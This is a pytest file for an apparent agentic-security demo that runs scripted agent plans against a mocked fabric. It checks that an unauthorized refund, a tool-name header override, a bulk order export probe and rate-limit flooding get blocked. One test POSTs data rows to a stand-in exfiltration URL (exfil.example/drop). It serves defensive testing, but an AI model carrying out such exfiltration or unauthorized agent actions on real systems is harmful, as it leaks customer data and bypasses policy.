"""run_plan against a fake fabric built on httpx.MockTransport (no network)."""

import asyncio
import json

import httpx
import pytest
from copperline_common.plan_executor import PREVIEW_LIMIT, ExecContext, run_plan
from copperline_common.scenarios import PlanError, Scenario

TOOLS = "http://tools.agentic-demo"
LLM = "http://llm.agentic-demo"
IDP = "http://idp.agentic-demo"
ORIGIN = {"x-copperline-origin": "mcp-servers"}


def scenario(plan, final_reply=None, sid="T1") -> Scenario:
    return Scenario(id=sid, title="t", persona="p", agent="a", message="m", trigger="m", plan=plan,
                    final_reply=final_reply)


def mcp_ok(text: str) -> httpx.Response:
    result = {"content": [{"type": "text", "text": text}], "isError": False, "resultType": "complete"}
    return httpx.Response(200, headers=ORIGIN, json={"jsonrpc": "2.0", "id": "1", "result": result})


def converse_ok(text: str) -> httpx.Response:
    body = {"output": {"message": {"role": "assistant", "content": [{"text": text}]}}, "stop_reason": "end_turn"}
    return httpx.Response(200, headers={"x-copperline-origin": "ai-gw"}, json=body)


class Fabric:
    """Routes requests to small handlers and records every request it saw."""

    def __init__(self, handler):
        self.handler = handler
        self.requests: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        return self.handler(request)


def run(plan_scenario: Scenario, fabric: Fabric, **ctx_kwargs):
    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(fabric)) as http:
            defaults = {
                "http": http, "tools_base_url": TOOLS, "llm_base_url": LLM, "idp_base_url": IDP,
                "tokens": {"aud:copperline-tools": "tools-tok", "aud:copperline-llm": "llm-tok"},
                "lb_base_urls": (TOOLS, LLM, IDP), "env": {},
            }
            defaults.update(ctx_kwargs)
            return await run_plan(plan_scenario, ExecContext(**defaults))

    return asyncio.run(go())


def test_s1_like_plan_blocks_and_feeds_summary_to_model():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/mcp/catalog":
            return mcp_ok('{"reviews": ["great tent"]}')
        if request.url.path == "/mcp/refunds":
            return httpx.Response(403, text="Forbidden by policy")  # no origin header: the fabric
        return converse_ok("Summary of reviews.")

    fabric = Fabric(handler)
    plan = [
        {"tool": "catalog.get_reviews", "args": {"product_id": "TNT-ALPINE-2"}},
        {"tool": "refunds.issue_refund", "args": {"order_id": "CO-1077", "amount": 499}},
        {"model": {"route": "fast"}},
    ]
    outcome = run(scenario(plan, sid="S1"), fabric, agent_id="shopper", obo_sub="mallory.x-ab",
                  conversation=[{"role": "user", "content": "Summarize"}], system_prompt="be nice")

    steps = outcome.steps
    assert [(s.n, s.i, s.kind) for s in steps] == [(1, 0, "tool"), (2, 1, "tool"), (3, 2, "model")]
    assert steps[0].status == 200 and steps[0].blocked_by is None and steps[0].is_error is False
    assert steps[0].result_preview == '{"reviews": ["great tent"]}' and steps[0].tool == "catalog.get_reviews"
    assert steps[0].target == f"{TOOLS}/mcp/catalog" and steps[0].scripted is True
    assert steps[1].status == 403 and steps[1].blocked_by == "xc" and steps[1].reason == "service policy"
    assert outcome.reply == "Summary of reviews." and outcome.stopped_early is False

    model_request = fabric.requests[2]
    assert model_request.headers["x-model-route"] == "fast"
    assert model_request.headers["x-demo-scenario"] == "S1"
    assert model_request.headers["x-agent-id"] == "shopper" and model_request.headers["x-obo-sub"] == "mallory.x-ab"
    assert model_request.headers["Authorization"] == "Bearer llm-tok"
    body = json.loads(model_request.content)
    assert body["system"] == "be nice" and body["max_tokens"] == 1024 and "tools" not in body
    summary = body["messages"][0]["content"][1]["text"]
    assert summary.splitlines() == [
        "Results of the tool calls you made:",
        '- catalog.get_reviews -> 200: {"reviews": ["great tent"]}',
        "- refunds.issue_refund -> 403: Tool call denied by policy (HTTP 403).",
    ]
    tool_request = fabric.requests[1]
    assert tool_request.headers["Authorization"] == "Bearer tools-tok"
    assert tool_request.headers["x-request-id"].startswith("S1-")
    assert len({step.request_id for step in steps}) == 3
    assert all(step.request_id.startswith("S1-") for step in steps)


def test_s1b_override_is_recorded_and_server_block_classified():
    def handler(request):
        error = {"code": -32020, "message": "HeaderMismatch", "data": {"header": "Mcp-Name"}}
        return httpx.Response(400, headers=ORIGIN, json={"jsonrpc": "2.0", "id": "1", "error": error})

    fabric = Fabric(handler)
    plan = [{"tool": "orders.get_order_details", "args": {"order_id": "CO-1042"},
             "header_name_override": "get_order_status"}]
    outcome = run(scenario(plan, final_reply="Sorry."), fabric)
    (step,) = outcome.steps
    assert step.mcp_name_header == "get_order_status" and step.tool == "orders.get_order_details"
    assert step.status == 400 and step.blocked_by == "server" and step.is_error is None
    assert fabric.requests[0].headers["Mcp-Name"] == "get_order_status"
    assert outcome.reply == "Sorry."


def test_override_equal_to_tool_is_not_reported():
    fabric = Fabric(lambda r: mcp_ok("{}"))
    plan = [{"tool": "orders.get_order_status", "args": {"order_id": "X"}, "header_name_override": "get_order_status"}]
    assert run(scenario(plan), fabric).steps[0].mcp_name_header is None


def test_repeat_concurrency_batches_sorted_by_i():
    in_flight = {"now": 0, "max": 0}

    async def slow_handler(request: httpx.Request) -> httpx.Response:
        in_flight["now"] += 1
        in_flight["max"] = max(in_flight["max"], in_flight["now"])
        page = int(request.url.params["page"])
        await asyncio.sleep(0.001 * (10 - page % 10))  # later pages finish first inside a batch
        in_flight["now"] -= 1
        status = 200 if page <= 3 else 429
        return httpx.Response(status, text="ok" if status == 200 else "Too Many Requests")

    plan = [
        {"token": {"grant": "client_credentials", "client_id": "granite-supply", "audience": "copperline-partner",
                   "save_as": "partner_tok", "url": "${PARTNER}/auth/token"}},
        {"http": {"method": "GET", "url": "${PARTNER}/v1/purchase-orders?page={n}", "auth": "partner_tok"},
         "repeat": 25, "concurrency": 10},
    ]

    async def go():
        token_response = {"access_token": "header.e30.sig"}

        async def handler(request):
            if request.url.path == "/auth/token":
                return httpx.Response(200, json=token_response)
            return await slow_handler(request)

        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
            ctx = ExecContext(http=http, tools_base_url=None, llm_base_url=None, idp_base_url=None, tokens={},
                              lb_base_urls=("http://partner",), env={"PARTNER": "http://partner"})
            return await run_plan(scenario(plan, sid="S6"), ctx, start_n=5)

    outcome = asyncio.run(go())
    steps = outcome.steps
    assert in_flight["max"] == 10
    assert [step.i for step in steps] == list(range(26))
    assert [step.n for step in steps] == list(range(5, 31))
    assert steps[1].target.endswith("page=1") and steps[25].target.endswith("page=25")
    assert [s.status for s in steps[1:5]] == [200, 200, 200, 429]
    assert all(s.blocked_by == "xc" and s.reason == "rate limited" for s in steps[4:])
    assert outcome.reply is None  # last step is not a model step and final_reply is null


def test_stop_on_status():
    calls = []

    def handler(request):
        calls.append(request)
        return httpx.Response(429, text="slow down") if len(calls) >= 3 else mcp_ok("{}")

    plan = [{"tool": "inventory.adjust_stock", "args_template": {"sku": "T", "store_id": "S-{n:03d}", "delta": 1},
             "repeat": 10, "stop_on_status": 429}, {"model": {"route": "standard"}}]
    outcome = run(scenario(plan), Fabric(handler))
    assert len(outcome.steps) == 3 and outcome.stopped_early is True
    assert json.loads(calls[2].content)["params"]["arguments"]["store_id"] == "S-003"


def test_token_steps_identity_and_no_secrets(monkeypatch, make_token):
    monkeypatch.setenv("AGENT_STOREOPS_SECRET", "super-secret-value")
    tokens_by_aud = {
        aud: make_token(sub="storeops", agent_id="storeops", agent_role="storeops", obo_sub="none",
                        obo_role="none", aud=aud)
        for aud in ("copperline-tools", "copperline-llm")
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/auth/token":
            form = dict(x.split("=") for x in request.content.decode().split("&"))
            assert form["client_secret"] == "super-secret-value"
            return httpx.Response(200, headers={"x-copperline-origin": "idp"},
                                  json={"access_token": tokens_by_aud[form["audience"]], "token_type": "Bearer"})
        if request.url.path == "/mcp/orders/export":
            return httpx.Response(403, text="denied")
        return mcp_ok("{}")

    plan = [
        {"token": {"grant": "client_credentials", "client_id": "agent-storeops", "audience": "copperline-tools",
                   "save_as": "tools_tok"}},
        {"token": {"grant": "client_credentials", "client_id": "agent-storeops", "audience": "copperline-llm",
                   "save_as": "llm_tok"}},
        {"tool": "orders.list_customer_orders", "args": {"customer_id": "*"}},
        {"http": {"method": "GET", "url": "${TOOLS_BASE_URL}/mcp/orders/export", "auth": "tools_tok"}},
        {"http": {"method": "GET", "url": "${TOOLS_BASE_URL}/x", "auth": "never_saved"}},
    ]
    fabric = Fabric(handler)
    outcome = run(scenario(plan, sid="S5"), fabric, tokens={}, env={"TOOLS_BASE_URL": TOOLS})
    token_step = outcome.steps[0]
    assert token_step.kind == "token" and token_step.target == f"{IDP}/auth/token" and token_step.status == 200
    assert token_step.identity == {"agent_id": "storeops", "agent_role": "storeops", "obo_sub": "none",
                                   "obo_role": "none", "aud": "copperline-tools", "sub": "storeops"}
    trace_text = json.dumps([step.to_dict() for step in outcome.steps])
    assert "super-secret-value" not in trace_text
    assert tokens_by_aud["copperline-tools"] not in trace_text
    # The plan token replaced the tools token: the tool step used the machine-mode token.
    assert fabric.requests[2].headers["Authorization"] == f"Bearer {tokens_by_aud['copperline-tools']}"
    assert outcome.steps[3].status == 403 and outcome.steps[3].blocked_by == "xc"
    missing = outcome.steps[4]
    assert missing.status is None and missing.blocked_by is None and missing.reason == "no token saved as never_saved"
    assert len(fabric.requests) == 4


def test_network_failure_is_data_and_http_body_sent():
    def handler(request):
        if request.url.host == "exfil.example":
            raise httpx.ConnectError("Connection refused")
        return httpx.Response(200)

    plan = [{"http": {"method": "POST", "url": "${EXFIL_TEST_URL}", "body": {"rows": 200},
                      "headers": {"x-extra": "1"}}}]
    fabric = Fabric(handler)
    (step,) = run(scenario(plan), fabric, env={"EXFIL_TEST_URL": "http://exfil.example/drop"}).steps
    assert step.status is None and step.blocked_by == "network" and "connect_error" in step.reason
    assert step.args_preview == '{"rows": 200}'
    (request,) = fabric.requests  # http steps make exactly one attempt
    assert json.loads(request.content) == {"rows": 200} and request.headers["x-extra"] == "1"
    assert request.headers["x-request-id"] == step.request_id


def test_decoding_error_mid_plan_is_data_and_the_plan_continues():
    def handler(request):
        if request.url.path == "/bad":
            return httpx.Response(200, headers={"content-encoding": "gzip"}, text="<html>not gzip</html>")
        return httpx.Response(200, json={"ok": True})

    seen = []
    plan = [{"http": {"method": "GET", "url": "http://p/good"}},
            {"http": {"method": "POST", "url": "http://p/bad", "body": {"rows": 200}}},
            {"http": {"method": "GET", "url": "http://p/good"}}]
    outcome = run(scenario(plan), Fabric(handler), lb_base_urls=(), step_hook=seen.append)
    assert [s.status for s in outcome.steps] == [200, None, 200] and seen == outcome.steps
    bad = outcome.steps[1]
    assert bad.blocked_by == "network" and bad.reason.startswith("DecodingError: ")


def test_previews_are_capped():
    big = "x" * (PREVIEW_LIMIT + 10)
    fabric = Fabric(lambda r: mcp_ok(big))
    plan = [{"tool": "catalog.search_products", "args": {"query": "q" * 500}}]
    (step,) = run(scenario(plan), fabric).steps
    assert len(step.result_preview) == PREVIEW_LIMIT and step.result_truncated is True
    assert len(step.args_preview) == 300


def test_model_failure_gives_no_reply_and_step_hook_runs():
    seen = []
    fabric = Fabric(lambda r: httpx.Response(403, text="nope"))
    outcome = run(scenario([{"model": {"route": "premium"}}]), fabric, step_hook=seen.append)
    assert outcome.reply is None and outcome.steps[0].blocked_by == "xc"
    assert seen == outcome.steps


def test_plan_errors_before_any_call():
    fabric = Fabric(lambda r: httpx.Response(200))
    with pytest.raises(PlanError):
        run(scenario([{"tool": "catalog.get_product", "args": {}}, {"http": {"method": "GET", "url": "${NOPE}"}}]),
            fabric)
    with pytest.raises(PlanError):
        run(scenario([{"tool": "catalog.get_product"}]), fabric, tools_base_url=None)
    assert fabric.requests == []


def test_raw_http_step_to_tools_base_url_counts_as_via_lb_without_listing_it():
    """S5's probe (GET ${TOOLS_BASE_URL}/mcp/orders/export) must be classified as a fabric block even when the
    caller did not repeat the tools URL in lb_base_urls."""
    def handler(request):
        if request.url.path == "/auth/token":
            return httpx.Response(200, headers={"x-copperline-origin": "idp"}, json={"access_token": "machine-tok"})
        return httpx.Response(403, text="denied")  # no x-copperline-origin: the fabric answered

    plan = [{"token": {"grant": "client_credentials", "client_id": "agent-storeops", "audience": "copperline-tools",
                       "save_as": "tools_tok"}},
            {"http": {"method": "GET", "url": "${TOOLS_BASE_URL}/mcp/orders/export", "auth": "tools_tok"}}]
    steps = run(scenario(plan), Fabric(handler), lb_base_urls=(), env={"TOOLS_BASE_URL": TOOLS}).steps
    assert steps[1].status == 403 and steps[1].blocked_by == "xc"
